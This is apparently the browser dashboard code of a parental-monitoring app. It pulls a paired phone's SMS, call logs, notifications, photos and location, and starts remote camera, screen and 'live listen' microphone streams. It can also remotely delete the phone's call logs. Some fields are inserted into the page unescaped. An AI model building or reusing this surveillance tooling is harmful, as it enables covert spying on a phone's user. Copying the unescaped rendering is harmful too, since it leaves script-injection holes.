// FamilyGuard Pro - Parent Dashboard JavaScript

const API_BASE = 'https://familyguard-backend-c2c9hkc8dwgzepdq.centralindia-01.azurewebsites.net/api';
const WS_BASE = 'wss://familyguard-backend-c2c9hkc8dwgzepdq.centralindia-01.azurewebsites.net/ws';
let authToken = localStorage.getItem('authToken');
let currentUser = null;
let devices = [];
let selectedDevice = null;
let streamSocket = null;

// Helper function to get device ID (works with both 'id' and '_id' formats)
function getDeviceId(device) {
  return device?.id || device?._id;
}

// DOM Elements
const loginPage = document.getElementById('loginPage');
const dashboardPage = document.getElementById('dashboardPage');
const notificationsPage = document.getElementById('notificationsPage');
const callsPage = document.getElementById('callsPage');
const locationPage = document.getElementById('locationPage');
const appsPage = document.getElementById('appsPage');
const settingsPage = document.getElementById('settingsPage');
const deviceSelector = document.getElementById('deviceSelector');
const sidebar = document.getElementById('sidebar');

// Auto-refresh interval (30 seconds)
let autoRefreshInterval = null;
const AUTO_REFRESH_MS = 30000;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  if (authToken) {
    loadUserData();
  } else {
    showLoginPage();
  }
  
  setupEventListeners();
});

// Start auto-refresh
function startAutoRefresh() {
  if (autoRefreshInterval) clearInterval(autoRefreshInterval);
  autoRefreshInterval = setInterval(() => {
    if (selectedDevice && !document.hidden) {
      console.log('Auto-refreshing data...');
      refreshDataSilent();
    }
  }, AUTO_REFRESH_MS);
}

// Stop auto-refresh
function stopAutoRefresh() {
  if (autoRefreshInterval) {
    clearInterval(autoRefreshInterval);
    autoRefreshInterval = null;
  }
}

// Refresh data without alerts
async function refreshDataSilent() {
  if (!selectedDevice) return;
  
  try {
    await loadDashboard();
  } catch (error) {
    console.error('Silent refresh failed:', error);
  }
}

// Event Listeners
function setupEventListeners() {
  // Login form
  document.getElementById('loginForm').addEventListener('submit', handleLogin);
  
  // Navigation
  document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
      const page = item.dataset.page;
      navigateTo(page);
    });
  });
  
  // View all links
  document.querySelectorAll('.view-all').forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const page = link.dataset.page;
      navigateTo(page);
    });
  });
  
  // Mobile menu
  document.getElementById('btnMenu').addEventListener('click', () => {
    sidebar.classList.toggle('open');
  });
  
  // Logout
  document.getElementById('btnLogout').addEventListener('click', handleLogout);
  
  // Device selector
  deviceSelector.addEventListener('change', handleDeviceChange);
  
  // Refresh button
  document.getElementById('btnRefresh').addEventListener('click', refreshData);
  
  // Add device
  document.getElementById('btnAddDevice').addEventListener('click', showPairingModal);
  document.getElementById('closePairing').addEventListener('click', hidePairingModal);
  document.getElementById('btnNewCode').addEventListener('click', generatePairingCode);
  
  // Quick actions
  document.getElementById('btnScreenMirror').addEventListener('click', () => startStream('screen'));
  document.getElementById('btnCamera').addEventListener('click', () => startStream('camera'));
  document.getElementById('btnLiveListen').addEventListener('click', () => startStream('audio'));
  document.getElementById('btnViewLocation').addEventListener('click', () => navigateTo('location'));
  document.getElementById('btnOpenApp')?.addEventListener('click', () => sendCommand('open_app'));
  document.getElementById('btnDeleteCallLogs').addEventListener('click', deleteCallLogs);
  document.getElementById('btnLockDevice').addEventListener('click', () => sendCommand('lock_device'));
  document.getElementById('btnRingDevice').addEventListener('click', ringDevice);
  document.getElementById('btnSyncNow').addEventListener('click', () => sendCommand('sync_data'));
  
  // Call history
  document.getElementById('btnDeleteAllCalls').addEventListener('click', deleteCallLogs);
  
  // Location
  document.getElementById('btnRefreshLocation').addEventListener('click', loadLocation);
  
  // Gallery
  document.getElementById('btnSyncPhotos')?.addEventListener('click', syncPhotos);
  document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
  
  // Stream modal
  document.getElementById('closeStream').addEventListener('click', stopStream);
  document.getElementById('btnStopStream').addEventListener('click', stopStream);
  
  // Request all permissions button
  document.getElementById('btnRequestAllPermissions')?.addEventListener('click', requestAllMissingPermissions);
  
  // Filter chips for notifications
  document.querySelectorAll('.chip[data-filter]').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      loadNotifications(chip.dataset.filter);
    });
  });
  
  // Filter chips for SMS
  document.querySelectorAll('.chip[data-sms-filter]').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('.chip[data-sms-filter]').forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      loadSmsMessages(chip.dataset.smsFilter);
    });
  });
  
  // Load more SMS
  document.getElementById('loadMoreSms')?.addEventListener('click', () => {
    loadSmsMessages(currentSmsFilter, smsPage + 1);
  });
  
  // Settings toggles
  document.querySelectorAll('.settings-section input[type="checkbox"]').forEach(toggle => {
    toggle.addEventListener('change', saveSettings);
  });
  
  // Remove device
  document.getElementById('btnRemoveDevice').addEventListener('click', removeDevice);
  
  // Uninstall app from device
  document.getElementById('btnUninstallApp')?.addEventListener('click', uninstallApp);
}

// API Functions
async function api(endpoint, options = {}) {
  const headers = {
    'Content-Type': 'application/json',
    ...options.headers
  };
  
  if (authToken) {
    headers['Authorization'] = `Bearer ${authToken}`;
  }
  
  try {
    const response = await fetch(`${API_BASE}${endpoint}`, {
      ...options,
      headers
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      // Extract error message properly - handle both string and object errors
      let errorMessage = 'Request failed';
      if (typeof data.error === 'string') {
        errorMessage = data.error;
      } else if (data.error && data.error.message) {
        errorMessage = data.error.message;
      } else if (data.message) {
        errorMessage = data.message;
      } else if (typeof data === 'string') {
        errorMessage = data;
      }
      
      const error = new Error(errorMessage);
      error.code = data.code || data.error?.code;
      error.status = response.status;
      error.hint = data.hint;
      throw error;
    }
    
    return data;
  } catch (error) {
    console.error('API Error:', error.message || error);
    throw error;
  }
}

// Auth Functions
async function handleLogin(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  try {
    const data = await api('/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });
    
    authToken = data.token;
    localStorage.setItem('authToken', authToken);
    currentUser = data.user;
    
    loadUserData();
  } catch (error) {
    alert('Login failed: ' + error.message);
  }
}

function handleLogout() {
  authToken = null;
  localStorage.removeItem('authToken');
  currentUser = null;
  devices = [];
  selectedDevice = null;
  showLoginPage();
}

async function loadUserData() {
  try {
    const data = await api('/auth/me');
    currentUser = data.user;
    document.getElementById('userName').textContent = currentUser.name;
    
    await loadDevices();
    
    if (devices.length > 0) {
      selectedDevice = devices[0];
      deviceSelector.value = getDeviceId(selectedDevice);
      showDashboard();
    } else {
      showDashboard();
    }
  } catch (error) {
    console.error('Failed to load user data:', error);
    handleLogout();
  }
}

async function loadDevices() {
  try {
    const data = await api('/devices');
    devices = data.devices || [];
    
    // Update device selector
    deviceSelector.innerHTML = '<option value="">Select Device</option>';
    
    if (devices.length === 0) {
      console.log('No devices found for this user');
    }
    
    devices.forEach(device => {
      const option = document.createElement('option');
      option.value = getDeviceId(device);
      option.textContent = device.name || 'Unknown Device';
      deviceSelector.appendChild(option);
    });
    
    if (selectedDevice) {
      deviceSelector.value = getDeviceId(selectedDevice);
    }
  } catch (error) {
    console.error('Failed to load devices:', error);
    devices = [];
  }
}

// Navigation
function navigateTo(page) {
  // Update nav items
  document.querySelectorAll('.nav-item').forEach(item => {
    item.classList.toggle('active', item.dataset.page === page);
  });
  
  // Hide all pages
  document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
  
  // Show selected page
  const pageElement = document.getElementById(`${page}Page`);
  if (pageElement) {
    pageElement.classList.remove('hidden');
    
    // Load page data
    switch (page) {
      case 'dashboard':
        loadDashboard();
        break;
      case 'notifications':
        loadNotifications();
        break;
      case 'calls':
        loadCallHistory();
        break;
      case 'sms':
        loadSmsMessages();
        break;
      case 'gallery':
        loadGallery();
        break;
      case 'location':
        loadLocation();
        break;
      case 'apps':
        loadAppUsage();
        break;
      case 'settings':
        loadSettings();
        break;
    }
  }
  
  // Close mobile sidebar
  sidebar.classList.remove('open');
}

function showLoginPage() {
  document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
  loginPage.classList.remove('hidden');
  document.querySelector('.sidebar').style.display = 'none';
  document.querySelector('.header').style.display = 'none';
  stopAutoRefresh();
}

function showDashboard() {
  document.querySelector('.sidebar').style.display = 'flex';
  document.querySelector('.header').style.display = 'flex';
  navigateTo('dashboard');
  startAutoRefresh();
}

// Dashboard
async function loadDashboard() {
  if (!selectedDevice) {
    document.getElementById('deviceStatusCard').style.display = 'none';
    return;
  }
  
  document.getElementById('deviceStatusCard').style.display = 'block';
  
  try {
    const deviceId = getDeviceId(selectedDevice);
    console.log('Loading device:', deviceId);
    const data = await api(`/devices/${deviceId}`);
    const device = data.device;
    
    if (!device) {
      console.error('Device data is empty');
      return;
    }
    
    document.getElementById('deviceName').textContent = device.name || 'Unknown';
    document.getElementById('deviceModel').textContent = device.model || 'Unknown Model';
    document.getElementById('lastSeen').textContent = `Last seen: ${formatTime(device.lastSeen)}`;
    document.getElementById('batteryLevel').textContent = `${device.batteryLevel || device.battery || 0}%`;
    document.getElementById('screenTime').textContent = formatDuration(device.screenTime || 0);
    document.getElementById('locationStatus').textContent = device.location ? 'Active' : 'Unknown';
    
    const statusDot = document.getElementById('statusDot');
    statusDot.className = `status-dot ${device.isOnline ? 'online' : 'offline'}`;
    
    // Load recent notifications
    loadRecentNotifications();
  } catch (error) {
    console.error('Failed to load dashboard:', error);
  }
}

async function loadRecentNotifications() {
  if (!selectedDevice) return;
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/notifications?limit=5`);
    const container = document.getElementById('recentNotifications');
    
    if (data.notifications.length === 0) {
      container.innerHTML = '<p class="empty-state">No recent notifications</p>';
      return;
    }
    
    container.innerHTML = data.notifications.map(notif => `
      <div class="activity-item">
        <div class="activity-icon">
          <i class="fas fa-bell"></i>
        </div>
        <div class="activity-info">
          <h4>${notif.appName || notif.packageName}</h4>
          <p>${notif.content || notif.title || 'No content'}</p>
        </div>
        <span class="activity-time">${formatTime(notif.timestamp)}</span>
      </div>
    `).join('');
    
    // Update badge
    document.getElementById('notifBadge').textContent = data.total || 0;
  } catch (error) {
    console.error('Failed to load notifications:', error);
  }
}

// Notifications Page
async function loadNotifications(filter = 'all') {
  if (!selectedDevice) {
    document.getElementById('notificationsList').innerHTML = '<p class="empty-state">Select a device to view notifications</p>';
    return;
  }
  
  try {
    let endpoint = `/devices/${getDeviceId(selectedDevice)}/notifications?limit=50`;
    if (filter !== 'all') {
      endpoint += `&app=${filter}`;
    }
    
    const data = await api(endpoint);
    const container = document.getElementById('notificationsList');
    
    if (!data.notifications || data.notifications.length === 0) {
      container.innerHTML = `
        <p class="empty-state">
          <i class="fas fa-bell-slash" style="font-size: 32px; margin-bottom: 12px;"></i><br>
          No notifications found.<br>
          <small>App notifications will appear here when the child device syncs.</small>
        </p>`;
      return;
    }
    
    container.innerHTML = data.notifications.map(notif => `
      <div class="notification-item">
        <div class="app-icon">
          ${getAppIcon(notif.packageName)}
        </div>
        <div class="content">
          <h4>${notif.appName || notif.packageName}</h4>
          ${notif.title ? `<p class="title">${notif.title}</p>` : ''}
          <p>${notif.content || 'No content'}</p>
        </div>
        <span class="time">${formatTime(notif.timestamp)}</span>
      </div>
    `).join('');
  } catch (error) {
    console.error('Failed to load notifications:', error);
    document.getElementById('notificationsList').innerHTML = '<p class="empty-state">Failed to load notifications</p>';
  }
}

// Call History
async function loadCallHistory() {
  if (!selectedDevice) {
    document.getElementById('callsList').innerHTML = '<p class="empty-state">Select a device to view call history</p>';
    return;
  }
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/call-logs`);
    
    // Update stats - handle missing data
    document.getElementById('totalCalls').textContent = data.total || 0;
    document.getElementById('incomingCalls').textContent = data.stats?.incoming || 0;
    document.getElementById('outgoingCalls').textContent = data.stats?.outgoing || 0;
    document.getElementById('missedCalls').textContent = data.stats?.missed || 0;
    
    const container = document.getElementById('callsList');
    
    if (!data.callLogs || data.callLogs.length === 0) {
      container.innerHTML = `
        <p class="empty-state">
          <i class="fas fa-phone-slash" style="font-size: 32px; margin-bottom: 12px;"></i><br>
          No call logs found.<br>
          <small>Call logs will appear here when the child device syncs.</small>
        </p>`;
      return;
    }
    
    container.innerHTML = data.callLogs.map(call => {
      const durationMins = Math.floor((call.duration || 0) / 60);
      const durationSecs = (call.duration || 0) % 60;
      const durationStr = durationMins > 0 ? `${durationMins}m ${durationSecs}s` : `${durationSecs}s`;
      const callTypeIcon = call.type === 'outgoing' ? 'fa-phone-alt' : call.type === 'missed' ? 'fa-phone-slash' : 'fa-phone';
      const callTypeColor = call.type === 'missed' ? 'missed' : call.type === 'outgoing' ? 'outgoing' : 'incoming';
      
      return `
        <div class="call-item">
          <div class="call-icon ${callTypeColor}">
            <i class="fas ${callTypeIcon}"></i>
          </div>
          <div class="call-info">
            <h4>${call.name || 'Unknown'}</h4>
            <p class="call-number">${call.number}</p>
            <p class="call-meta">${call.type.charAt(0).toUpperCase() + call.type.slice(1)} · ${durationStr}</p>
          </div>
          <div class="call-time">
            <span class="time">${formatTime(call.timestamp)}</span>
          </div>
        </div>
      `;
    }).join('');
  } catch (error) {
    console.error('Failed to load call history:', error);
    document.getElementById('callsList').innerHTML = '<p class="empty-state">Failed to load call logs</p>';
  }
}

async function deleteCallLogs() {
  if (!selectedDevice) return;
  
  if (!confirm('Are you sure you want to delete all call logs from the child device? This action cannot be undone.')) {
    return;
  }
  
  try {
    await api(`/devices/${getDeviceId(selectedDevice)}/call-logs`, { method: 'DELETE' });
    alert('Call logs deletion command sent to device');
    loadCallHistory();
  } catch (error) {
    alert('Failed to delete call logs: ' + error.message);
  }
}

// SMS Messages
let currentSmsFilter = 'all';
let smsPage = 1;

async function loadSmsMessages(filter = currentSmsFilter, page = 1) {
  if (!selectedDevice) {
    document.getElementById('smsList').innerHTML = '<p class="empty-state">Select a device to view SMS messages</p>';
    return;
  }
  
  currentSmsFilter = filter;
  smsPage = page;
  
  try {
    const typeParam = filter === 'all' ? '' : `&type=${filter}`;
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/sms?page=${page}&limit=50${typeParam}`);
    
    // Update stats
    document.getElementById('totalSms').textContent = data.total || 0;
    
    const container = document.getElementById('smsList');
    
    if (!data.sms || data.sms.length === 0) {
      container.innerHTML = `
        <p class="empty-state">
          <i class="fas fa-sms" style="font-size: 32px; margin-bottom: 12px;"></i><br>
          No SMS messages found.<br>
          <small>SMS messages will appear here when the child device syncs.</small>
        </p>`;
      document.getElementById('loadMoreSms').classList.add('hidden');
      return;
    }
    
    // Count inbox and sent
    let inboxCount = 0;
    let sentCount = 0;
    data.sms.forEach(sms => {
      if (sms.type === 'inbox') inboxCount++;
      else if (sms.type === 'sent') sentCount++;
    });
    
    document.getElementById('inboxSms').textContent = inboxCount;
    document.getElementById('sentSms').textContent = sentCount;
    
    container.innerHTML = data.sms.map(sms => {
      const typeIcon = sms.type === 'sent' ? 'fa-paper-plane' : 'fa-inbox';
      const typeColor = sms.type === 'sent' ? 'outgoing' : 'incoming';
      const readClass = sms.read ? '' : 'unread';
      
      return `
        <div class="sms-item ${readClass}">
          <div class="sms-icon ${typeColor}">
            <i class="fas ${typeIcon}"></i>
          </div>
          <div class="sms-info">
            <h4>${sms.contactName || sms.address || 'Unknown'}</h4>
            <p class="sms-number">${sms.address}</p>
            <p class="sms-body">${escapeHtml(sms.body || '')}</p>
          </div>
          <div class="sms-time">
            <span class="time">${formatTime(sms.date)}</span>
            <span class="sms-type">${sms.type}</span>
          </div>
        </div>
      `;
    }).join('');
    
    // Show/hide load more button
    const loadMoreBtn = document.getElementById('loadMoreSms');
    if (data.page < data.pages) {
      loadMoreBtn.classList.remove('hidden');
    } else {
      loadMoreBtn.classList.add('hidden');
    }
    
  } catch (error) {
    console.error('Failed to load SMS messages:', error);
    document.getElementById('smsList').innerHTML = '<p class="empty-state">Failed to load SMS messages</p>';
  }
}

// Escape HTML for safe display
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Location
async function loadLocation() {
  if (!selectedDevice) {
    document.getElementById('currentAddress').textContent = 'Select a device to view location';
    return;
  }
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/location`);
    const location = data.currentLocation;
    
    if (location && location.latitude && location.longitude) {
      document.getElementById('currentAddress').textContent = location.address || 'Address not available';
      document.getElementById('latitude').textContent = location.latitude.toFixed(6);
      document.getElementById('longitude').textContent = location.longitude.toFixed(6);
      document.getElementById('accuracy').textContent = `${location.accuracy || 0}m`;
      document.getElementById('locationTime').textContent = formatTime(location.timestamp);
      
      // Update Google Maps link
      const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      document.getElementById('btnOpenMaps').href = mapsUrl;
      
      // Update map using OpenStreetMap (no API key required)
      const mapContainer = document.getElementById('mapContainer');
      mapContainer.innerHTML = `
        <iframe 
          width="100%" 
          height="100%" 
          frameborder="0" 
          style="border:0; border-radius: 12px;" 
          src="https://www.openstreetmap.org/export/embed.html?bbox=${location.longitude - 0.01},${location.latitude - 0.01},${location.longitude + 0.01},${location.latitude + 0.01}&layer=mapnik&marker=${location.latitude},${location.longitude}"
          allowfullscreen>
        </iframe>
      `;
    } else {
      document.getElementById('currentAddress').textContent = 'Location not available';
      document.getElementById('latitude').textContent = '--';
      document.getElementById('longitude').textContent = '--';
      document.getElementById('accuracy').textContent = '--';
      document.getElementById('locationTime').textContent = '--';
      
      document.getElementById('mapContainer').innerHTML = `
        <p class="map-placeholder">
          <i class="fas fa-map-marker-alt" style="font-size: 48px; color: var(--text-secondary);"></i>
          <br><br>
          No location data available.<br>
          Make sure location tracking is enabled on the child device.
        </p>
      `;
    }
  } catch (error) {
    console.error('Failed to load location:', error);
    document.getElementById('currentAddress').textContent = 'Failed to load location';
  }
}

// App Usage
async function loadAppUsage() {
  if (!selectedDevice) {
    document.getElementById('appUsageList').innerHTML = '<p class="empty-state">Select a device to view app usage</p>';
    return;
  }
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/apps`);
    
    // Blocked apps
    const blockedContainer = document.getElementById('blockedApps');
    if (data.blockedApps && data.blockedApps.length > 0) {
      blockedContainer.innerHTML = data.blockedApps.map(app => `
        <span class="blocked-app-tag">
          ${app}
          <button onclick="unblockApp('${app}')"><i class="fas fa-times"></i></button>
        </span>
      `).join('');
    } else {
      blockedContainer.innerHTML = '<p class="empty-state">No apps blocked</p>';
    }
    
    // App usage
    const usageContainer = document.getElementById('appUsageList');
    if (data.usage && data.usage.length > 0) {
      const maxTime = Math.max(...data.usage.map(a => a.totalTime || 0));
      
      usageContainer.innerHTML = data.usage.map(app => `
        <div class="app-usage-item">
          <div class="app-icon">
            <i class="fas fa-mobile-alt"></i>
          </div>
          <div class="app-info">
            <h4>${app.appName || app._id}</h4>
            <div class="usage-bar">
              <div class="fill" style="width: ${((app.totalTime || 0) / maxTime) * 100}%"></div>
            </div>
          </div>
          <span class="usage-time">${formatDuration(app.totalTime || 0)}</span>
        </div>
      `).join('');
    } else {
      usageContainer.innerHTML = `
        <p class="empty-state">
          <i class="fas fa-chart-bar" style="font-size: 32px; margin-bottom: 12px;"></i><br>
          No usage data available.<br>
          <small>App usage will appear here when the child device syncs.</small>
        </p>`;
    }
  } catch (error) {
    console.error('Failed to load app usage:', error);
    document.getElementById('appUsageList').innerHTML = '<p class="empty-state">Failed to load app usage</p>';
  }
}

// ========== GALLERY ==========
async function loadGallery() {
  if (!selectedDevice) {
    document.getElementById('galleryGrid').innerHTML = '<p class="empty-state">Select a device to view gallery</p>';
    return;
  }
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/photos?hours=24`);
    
    document.getElementById('photoCount').textContent = `${data.total || 0} photos`;
    
    const container = document.getElementById('galleryGrid');
    
    if (!data.photos || data.photos.length === 0) {
      container.innerHTML = '<p class="empty-state">No photos found. Tap "Sync Photos" to fetch recent photos from the device.</p>';
      return;
    }
    
    container.innerHTML = data.photos.map(photo => `
      <div class="gallery-item" onclick="viewPhoto('${photo.id}')">
        <img src="data:${photo.mimeType || 'image/jpeg'};base64,${photo.thumbnail}" alt="${photo.fileName}">
        <div class="gallery-item-info">
          <span class="photo-time">${formatTime(photo.dateTaken || photo.timestamp)}</span>
        </div>
      </div>
    `).join('');
  } catch (error) {
    console.error('Failed to load gallery:', error);
    document.getElementById('galleryGrid').innerHTML = '<p class="empty-state">Failed to load photos</p>';
  }
}

async function syncPhotos() {
  if (!selectedDevice) return;
  
  try {
    await api(`/devices/${getDeviceId(selectedDevice)}/photos/sync`, {
      method: 'POST',
      body: JSON.stringify({ hours: 24 })
    });
    alert('Photo sync request sent. Please wait a moment and refresh.');
    
    // Reload gallery after a short delay
    setTimeout(() => loadGallery(), 3000);
  } catch (error) {
    alert('Failed to sync photos: ' + error.message);
  }
}

async function viewPhoto(photoId) {
  if (!selectedDevice) return;
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}/photos/${photoId}`);
    const photo = data.photo;
    
    document.getElementById('photoFileName').textContent = photo.fileName || 'Photo';
    document.getElementById('fullPhotoImage').src = `data:${photo.mimeType || 'image/jpeg'};base64,${photo.image}`;
    document.getElementById('photoDate').textContent = `Date: ${new Date(photo.dateTaken || photo.timestamp).toLocaleString()}`;
    document.getElementById('photoSize').textContent = `Size: ${formatFileSize(photo.size)}`;
    
    document.getElementById('photoModal').classList.remove('hidden');
  } catch (error) {
    alert('Failed to load photo: ' + error.message);
  }
}

function closePhotoModal() {
  document.getElementById('photoModal').classList.add('hidden');
}

function formatFileSize(bytes) {
  if (!bytes) return 'Unknown';
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}

// Settings
async function loadSettings() {
  if (!selectedDevice) return;
  
  try {
    const data = await api(`/devices/${getDeviceId(selectedDevice)}`);
    const settings = data.device.settings;
    
    document.getElementById('toggleScreenMirror').checked = settings.screenMirrorEnabled;
    document.getElementById('toggleCamera').checked = settings.cameraEnabled;
    document.getElementById('toggleLiveListen').checked = settings.liveListenEnabled;
    document.getElementById('toggleCallRecord').checked = settings.callRecordEnabled;
    document.getElementById('toggleLocation').checked = settings.locationTrackEnabled;
    
    // Load permissions for this device
    loadPermissions();
    
    // Check PIN status
    checkPinStatus();
  } catch (error) {
    console.error('Failed to load settings:', error);
  }
}

async function saveSettings() {
  if (!selectedDevice) return;
  
  const settings = {
    screenMirrorEnabled: document.getElementById('toggleScreenMirror').checked,
    cameraEnabled: document.getElementById('toggleCamera').checked,
    liveListenEnabled: document.getElementById('toggleLiveListen').checked,
    callRecordEnabled: document.getElementById('toggleCallRecord').checked,
    locationTrackEnabled: document.getElementById('toggleLocation').checked
  };
  
  try {
    await api(`/devices/${getDeviceId(selectedDevice)}/settings`, {
      method: 'PUT',
      body: JSON.stringify({ settings })
    });
  } catch (error) {
    console.error('Failed to save settings:', error);
    alert('Failed to save settings');
  }
}

// Uninstall app from child device
async function uninstallApp() {
  if (!selectedDevice) return;
  
  const confirmed = confirm(
    '⚠️ WARNING: This will uninstall FamilyGuard from the child device.\n\n' +
    'You will lose all monitoring capabilities and the device will need to be set up again.\n\n' +
    'Are you sure you want to continue?'
  );
  
  if (!confirmed) return;
  
  // Double confirmation for safety
  const doubleConfirm = confirm(
    'FINAL CONFIRMATION\n\n' +
    'This action cannot be undone remotely. The app will be uninstalled from the child device.\n\n' +
    'Click OK to proceed with uninstallation.'
  );
  
  if (!doubleConfirm) return;
  
  try {
    await sendCommand('uninstall_app');
    alert('Uninstall command sent to device. The app will be uninstalled shortly.');
  } catch (error) {
    alert('Failed to send uninstall command: ' + error.message);
  }
}

async function removeDevice() {
  if (!selectedDevice) return;
  
  if (!confirm('Are you sure you want to remove this device? All data will be deleted.')) {
    return;
  }
  
  // Check if PIN is required
  try {
    const pinCheck = await api('/auth/has-pin');
    
    if (pinCheck.hasPinSet) {
      // Show PIN prompt
      const pin = prompt('Enter your security PIN to remove this device:');
      if (!pin) {
        return; // User cancelled
      }
      
      // Verify and remove with PIN
      await api(`/devices/${getDeviceId(selectedDevice)}`, { 
        method: 'DELETE',
        body: JSON.stringify({ pin })
      });
    } else {
      // No PIN set, just remove
      await api(`/devices/${getDeviceId(selectedDevice)}`, { method: 'DELETE' });
    }
    
    alert('Device removed successfully');
    selectedDevice = null;
    await loadDevices();
    navigateTo('dashboard');
  } catch (error) {
    alert('Failed to remove device: ' + error.message);
  }
}

// Commands - use WebSocket fallback when FCM is not available
async function sendCommand(command, params = {}, silent = false) {
  if (!selectedDevice) return;
  
  try {
    await api(`/devices/${getDeviceId(selectedDevice)}/command`, {
      method: 'POST',
      body: JSON.stringify({ command, params })
    });
    if (!silent) {
      console.log(`Command '${command}' sent via FCM`);
    }
  } catch (error) {
    console.warn('FCM command failed, trying WebSocket fallback:', error.message);
    
    // Try WebSocket fallback
    try {
      const deviceId = selectedDevice.deviceId || getDeviceId(selectedDevice);
      const wsUrl = `${WS_BASE}?session=${deviceId}_command&role=parent&deviceId=${deviceId}&type=command`;
      
      const cmdSocket = new WebSocket(wsUrl);
      cmdSocket.onopen = () => {
        cmdSocket.send(JSON.stringify({
          type: 'command',
          command,
          params
        }));
        if (!silent) {
          console.log(`Command '${command}' sent via WebSocket`);
        }
        setTimeout(() => cmdSocket.close(), 2000);
      };
      cmdSocket.onerror = () => {
        if (!silent) {
          alert('Device is offline or not connected. Command queued for when device comes online.');
        }
      };
    } catch (wsError) {
      if (!silent) {
        alert('Failed to send command: ' + error.message);
      }
    }
  }
}

// Streaming
let streamTimeout = null;
let streamAttempts = 0;
const MAX_STREAM_ATTEMPTS = 3;
const STREAM_TIMEOUT_MS = 15000; // 15 seconds

function startStream(type) {
  if (!selectedDevice) {
    alert('Please select a device first');
    return;
  }
  
  // Check if device has required permissions before streaming
  const permissions = selectedDevice.permissions || {};
  const missingPermissions = [];
  
  if (type === 'camera') {
    if (!permissions.camera) missingPermissions.push('Camera');
  } else if (type === 'audio') {
    if (!permissions.microphone) missingPermissions.push('Microphone');
  } else if (type === 'screen') {
    // Screen mirror requires MediaProjection which needs user interaction on device
    // Can't be requested remotely
  }
  
  const modal = document.getElementById('streamModal');
  const title = document.getElementById('streamTitle');
  const streamVideo = document.getElementById('streamVideo');
  
  const titles = {
    screen: 'Screen Mirror',
    camera: 'Remote Camera',
    audio: 'Live Listen'
  };
  
  currentStreamType = type;
  streamAttempts = 0;
  title.textContent = titles[type];
  modal.classList.remove('hidden');
  
  // Show connecting message
  streamVideo.innerHTML = '<p class="connecting">Connecting to device...</p>';
  
  // Start stream command on device (silent - don't show alerts)
  const commands = {
    screen: 'start_screen_mirror',
    camera: 'start_camera',
    audio: 'start_live_listen'
  };
  
  sendCommand(commands[type], {}, true);
  
  // Connect to WebSocket as receiver - use Android deviceId
  const deviceId = selectedDevice.deviceId || selectedDevice.id;
  const sessionId = `${deviceId}_${type}`;
  const wsUrl = `${WS_BASE}?session=${sessionId}&role=receiver&deviceId=${deviceId}&type=${type}`;
  
  console.log('Connecting to WebSocket:', wsUrl);
  
  // Close existing connection
  if (streamSocket) {
    streamSocket.close();
    streamSocket = null;
  }
  
  // Clear any existing timeout
  if (streamTimeout) {
    clearTimeout(streamTimeout);
    streamTimeout = null;
  }
  
  streamSocket = new WebSocket(wsUrl);
  let streamStarted = false;
  
  streamSocket.onopen = () => {
    console.log('WebSocket connected');
    streamVideo.innerHTML = '<p class="connecting">Waiting for device stream...</p>';
    
    // Set timeout for stream to start
    streamTimeout = setTimeout(() => {
      if (!streamStarted) {
        streamAttempts++;
        if (streamAttempts >= MAX_STREAM_ATTEMPTS) {
          showStreamError(type, permissions);
        } else {
          // Retry
          streamVideo.innerHTML = `<p class="connecting">Retrying... (Attempt ${streamAttempts + 1}/${MAX_STREAM_ATTEMPTS})</p>`;
          sendCommand(commands[type], {}, true);
          
          // Reset timeout for next attempt
          streamTimeout = setTimeout(() => {
            if (!streamStarted) {
              streamAttempts++;
              if (streamAttempts >= MAX_STREAM_ATTEMPTS) {
                showStreamError(type, permissions);
              }
            }
          }, STREAM_TIMEOUT_MS);
        }
      }
    }, STREAM_TIMEOUT_MS);
  };
  
  streamSocket.onmessage = (event) => {
    // Handle incoming stream data
    if (typeof event.data === 'string') {
      const msg = JSON.parse(event.data);
      if (msg.type === 'waiting') {
        streamVideo.innerHTML = '<p class="connecting">Waiting for device to start streaming...</p>';
      } else if (msg.type === 'connected' || msg.type === 'stream_started') {
        streamStarted = true;
        if (streamTimeout) {
          clearTimeout(streamTimeout);
          streamTimeout = null;
        }
        streamVideo.innerHTML = '<p class="connecting">Stream connected, receiving data...</p>';
      } else if (msg.type === 'error') {
        streamStarted = true; // Prevent timeout error from showing
        if (streamTimeout) {
          clearTimeout(streamTimeout);
          streamTimeout = null;
        }
        showStreamErrorMessage(msg.message || msg.error || 'Unknown error', type, permissions);
      } else if (msg.type === 'permission_denied' || msg.type === 'permission_required') {
        streamStarted = true;
        if (streamTimeout) {
          clearTimeout(streamTimeout);
          streamTimeout = null;
        }
        showStreamError(type, permissions, msg.permission || msg.message);
      }
    } else {
      // Binary data - video/audio frame - stream is working!
      streamStarted = true;
      if (streamTimeout) {
        clearTimeout(streamTimeout);
        streamTimeout = null;
      }
      handleStreamData(event.data, type);
    }
  };
  
  streamSocket.onerror = (error) => {
    console.error('WebSocket error:', error);
    if (streamTimeout) {
      clearTimeout(streamTimeout);
      streamTimeout = null;
    }
    streamVideo.innerHTML = '<p class="error">Connection error. Please try again.</p>';
